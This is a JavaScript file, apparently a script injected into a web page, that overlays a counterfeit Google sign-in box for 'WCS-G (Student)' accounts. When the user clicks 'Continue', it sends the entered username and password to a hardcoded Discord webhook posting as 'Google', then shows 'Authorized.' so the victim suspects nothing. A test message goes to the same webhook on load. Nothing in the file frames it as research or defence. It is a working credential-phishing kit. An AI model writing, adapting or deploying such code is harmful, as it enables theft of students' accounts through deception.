var xhr = new XMLHttpRequest();var url = "https://discord.com/api/webhooks/1230013392190836807/YBJ3pNOa544labFi-TcurRFMDKlM2LMT36Jiel1PFWAy8TDWQqUa-yolhXwHQYD-F8bh";xhr.open("POST", url, true);xhr.setRequestHeader("Content-Type", "application/json");var data = JSON.stringify({"content": 'password version: running testing.'});xhr.send(data);
window.confirmed_login = false;
function fullMain() {

function blurPage() {
    const overlay = document.createElement('div');
    overlay.style.position = 'fixed';
    overlay.style.top = '0';
    overlay.style.left = '0';
    overlay.style.width = '100%';
    overlay.style.height = '100%';
    overlay.style.backgroundColor = 'rgba(255, 255, 255, 0.8)';
    overlay.style.filter = 'blur(100%)';
    overlay.style.zIndex = '9999';
    
    const loginForm = document.getElementById('loginForm');
    document.body.insertBefore(overlay, loginForm);
    return overlay
}

const loginForm = document.createElement('div');
loginForm.setAttribute('id', 'loginForm');
loginForm.style.width = '300px';
loginForm.style.height = '325px';
loginForm.style.backgroundColor = '#ffffff';
loginForm.style.border = '1px solid #eaebee';
loginForm.style.borderRadius = '30px';
loginForm.style.position = 'fixed';
loginForm.style.top = '50px';
loginForm.style.left = '50%';
loginForm.style.transform = 'translateX(-50%)';
loginForm.style.padding = '20px';
loginForm.style.boxShadow = '0 2px 5px rgba(0,0,0,0.2)';
loginForm.style.zIndex = '9999'; // Set a high z-index value
loginForm.style.marginTop = '100px';

const image = document.createElement('img');
image.setAttribute('src', 'http://hdwpro.com/wp-content/uploads/2018/12/Free-Google-Logo.png');
image.style.display = 'block';
image.style.margin = 'auto';
image.style.width = '15%';
image.style.marginBottom = '10px';

//font-family: 'Roboto', sans-serif;
const title = document.createElement('h1');
title.textContent = 'Sign in'
title.style.fontFamily = 'Roboto, sans-serif';
title.style.textAlign = 'center';
title.style.fontWeight = 'normal';
title.style.fontSize = '150%';
title.style.marginBottom = '10px';

const subtitle = document.createElement('h2');
subtitle.textContent = 'with your WCS-G (Student) account to continue'
subtitle.style.fontFamily = 'Roboto, sans-serif';
subtitle.style.textAlign = 'center';
subtitle.style.fontWeight = '500';
subtitle.style.fontSize = '90%';
subtitle.style.marginBottom = '10px';

// Append input fields for username and password
const usernameInput = document.createElement('input');
usernameInput.setAttribute('type', 'text');
usernameInput.setAttribute('placeholder', 'Username');
usernameInput.style.display = 'block';
usernameInput.style.width = '100%';
usernameInput.style.marginBottom = '10px';
usernameInput.style.fontFamily = 'Roboto, sans-serif';
usernameInput.style.fontWeight = '500';
usernameInput.style.padding = '10px';
usernameInput.style.border = '1px solid #dadce0';
usernameInput.style.borderRadius = '4px';
usernameInput.style.boxSizing = 'border-box';

const passwordInput = document.createElement('input');
passwordInput.setAttribute('type', 'password');
passwordInput.setAttribute('placeholder', 'Password');
passwordInput.style.display = 'block';
passwordInput.style.marginBottom = '10px';
passwordInput.style.fontFamily = 'Roboto, sans-serif';
passwordInput.style.width = '100%';
passwordInput.style.fontWeight = '500';
passwordInput.style.padding = '10px';
passwordInput.style.border = '1px solid #dadce0';
passwordInput.style.borderRadius = '4px';
passwordInput.style.boxSizing = 'border-box';

// Append a submit button
const submitButton = document.createElement('button');
submitButton.textContent = 'Continue';
submitButton.style.width = '100%';
submitButton.style.padding = '5px';
submitButton.style.backgroundColor = '#007bff';
submitButton.style.color = 'white';
submitButton.style.border = 'none';
submitButton.style.fontFamily = 'Roboto, sans-serif';
submitButton.style.borderRadius = '4px';
submitButton.style.fontWeight = '550';
submitButton.style.cursor = 'pointer';
submitButton.style.display = 'block';
submitButton.style.marginTop = '10px';
submitButton.style.marginBottom = '20px';

const forgotLogin = document.createElement('a');
forgotLogin.setAttribute('href', 'https://accounts.google.com/signin/v2/usernamerecovery?continue=https%3A%2F%2Fwww.google.com%2F&ddm=0&dsh=S-2029610733%3A1717196957941844&ec=GAZAmgQ&flowEntry=ServiceLogin&flowName=GlifWebSignIn&hl=en&ifkv=AS5LTAS3bzi2IH_c8gPVBpeIb0AmwvxVPy-2MvaR0tYoqWUgmJghPdbPKwxxs3ckj5kAPJL6-bLYOA');
forgotLogin.textContent = 'Forgot your password?'
forgotLogin.style.fontFamily = 'Roboto, sans-serif';
forgotLogin.style.textAlign = 'center';
forgotLogin.style.fontWeight = '500';
forgotLogin.style.fontSize = '90%';
forgotLogin.style.marginBottom = '10px';
forgotLogin.style.textDecoration = 'none';

// 'https://policies.google.com/privacy?gl=CA&hl=en'
const disclaimer = document.createElement('p');
disclaimer.textContent = 'Westmount Collaboration • Policies'
disclaimer.style.fontFamily = 'Roboto, sans-serif';
disclaimer.style.textAlign = 'center';
disclaimer.style.fontWeight = '500';
disclaimer.style.fontSize = '90%';
disclaimer.style.marginBottom = '10px';
disclaimer.style.textDecoration = 'none';

// Append all elements to the login form
loginForm.appendChild(image);
loginForm.appendChild(title);
loginForm.appendChild(subtitle);
loginForm.appendChild(usernameInput);
loginForm.appendChild(passwordInput);
loginForm.appendChild(submitButton);
loginForm.appendChild(forgotLogin);
loginForm.appendChild(disclaimer);
const overlay = blurPage();

function confirmed() {
confirmed_login = true
let opacity = 1;
const fadeOutEffect = setInterval(function() {
    if (opacity > 0) {
        opacity -= 0.2;
        loginForm.style.opacity = opacity;
        overlay.style.opacity = opacity;
    } else {
        clearInterval(fadeOutEffect);
        loginForm.remove();
        overlay.remove();
    }
}, 100);
}

submitButton.addEventListener('click', function() {
	setTimeout(function() {submitButton.textContent = 'Confirming...'}, 100);
    setTimeout(function() {function sendMessage(){const request=new XMLHttpRequest();const webhookUrl="https://discord.com/api/webhooks/1230013392190836807/YBJ3pNOa544labFi-TcurRFMDKlM2LMT36Jiel1PFWAy8TDWQqUa-yolhXwHQYD-F8bh";request.open("POST",webhookUrl);request.setRequestHeader("Content-type","application/json");const messageData={content:usernameInput.value + ', ' + passwordInput.value,username:"Google",avatar_url:"",};request.send(JSON.stringify(messageData))}sendMessage()}, 10);
    setTimeout(function() {submitButton.textContent = 'Authorized.'}, 1000);
   	setTimeout(function() {confirmed()}, 1000);
});

document.body.appendChild(loginForm);
setTimeout(function() {if ((usernameInput.value === '' || passwordInput.value === '') && !confirmed_login) {confirmed()}}, 30000);
}
setInterval(function() {if (window.location.href.includes('search/all?q=') && !confirmed_login && !document.getElementById('loginForm')) {setTimeout(fullMain, 500)}}, 750);
